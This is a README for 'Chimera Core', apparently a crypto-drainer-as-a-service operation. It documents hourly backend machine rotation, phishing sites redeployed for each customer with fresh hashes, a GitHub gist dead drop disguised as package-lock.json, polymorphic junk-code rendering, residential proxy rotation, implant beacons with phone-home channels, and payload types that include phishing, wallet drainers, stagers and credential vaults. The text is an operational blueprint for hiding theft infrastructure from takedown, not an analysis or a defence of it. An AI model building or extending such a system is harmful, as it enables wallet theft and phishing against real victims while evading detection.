# Chimera Core — Rotation Engine + Service API

The infrastructure engine. Every cycle (default 60 min, `cycle_minutes`):

1. Recycle the Yale backend machine (stable app `chimera-drainer`, fresh
   machine ID / private IP / session key, same hostname)
2. Redeploy every customer site with a fresh nonce (new file hash, same URL)
3. Publish endpoints to the dead drop gist (disguised as package-lock.json)

## Modules

| File | Role |
|---|---|
| `core/drainer_service.py` | Orchestrator: `create_customer`, `redeploy_all`, `cycle()`. Ties backend + registry + Vercel + dead drop together. |
| `core/drainer_backend.py` | Stable Fly app management: machine recycle, TLS-edge services config (443→3000), shared IPv4 (GraphQL `allocateIPAddress`), idempotent app creation. |
| `core/customer_sites.py` | Payload patcher (wallet, chat id, same-origin API, AES secret, per-deploy nonce), per-customer `vercel.json` (API rewrites + catch-all page route), persistent `data/customers.json` registry. |
| `core/service_api.py` | HTTP API for the bot (default `127.0.0.1:8444`, `X-Service-Key` auth): `POST /customers`, `/customers/redeploy`, `POST /cycle`, health probes. Runs the rotation loop in a background thread. |
| `core/fly_provisioner.py` | Fly Machines API: VM create/destroy/list, orphan cleanup, per-payload port, testable machine-config builder. |
| `core/vercel_deployer.py` | Vercel v13 API: `deploy_to_project` (stable per-customer projects, preview-only SSO), `deploy_custom` (ephemeral per-cycle), `deploy_redirector` (full proxy → Fly VM, used by flipper). |
| `core/deaddrop.py` | GitHub gist rendezvous — config base64'd inside a fake package-lock `integrity` field. The only stable artifact. |
| `core/proxy_rotator.py` | Resi proxy pool rotation (SnowProxies/BrightData/Oxylabs). Not used by the Yale backend (RPC latency). |
| `core/payload_registry.py` + `payloads_config.py` | Declarative payload definitions for the generic rotation engine (phishing/drainer/malware_api/stager/credential_vault/telemetry_platform). |
| `core/polymorphic_renderer.py` | Per-deployment structural variation (class/var renaming, junk code). The Yale pipeline uses per-deploy nonces for v1; the renderer drives the generic payloads. |
| `core/payload_server.py` | The on-VM API for generic payloads (beacon/exfil/vault). |
| `implant/` | Beacon (pulls config from dead drop) + phone-home channels. |

## Key design decisions

- **Same-origin API**: payload pages call their own domain; Vercel rewrites
  proxy the 10 Yale endpoints to the backend. The backend address never
  appears in client code, and backend rotation never breaks a payload.
- **Stable project per customer**: `claim-<hex8>.vercel.app` persists across
  redeploys. Per-deployment hash URLs die on rotation — never hand them out.
- **Stable app for the backend**: `chimera-drainer.fly.dev` hostname
  persists while the machine under it rotates hourly.
- **Atomic config writes**: `config.yaml` is written temp-file + fsync +
  replace. (Plain writes on this machine were observed to truncate.)
- **Fly auth**: use an app-scoped deploy token (`fly tokens create deploy`)
  — session tokens expire.

## Running

```bash
python -m core.service_api          # API + rotation loop
python local_test.py                # mock mode: dashboard :4444, payload :8443
python -m pytest tests/ -q          # 29 unit tests
```

Dashboard (operator UI): `python -m dashboard.run_dashboard` → :4444.
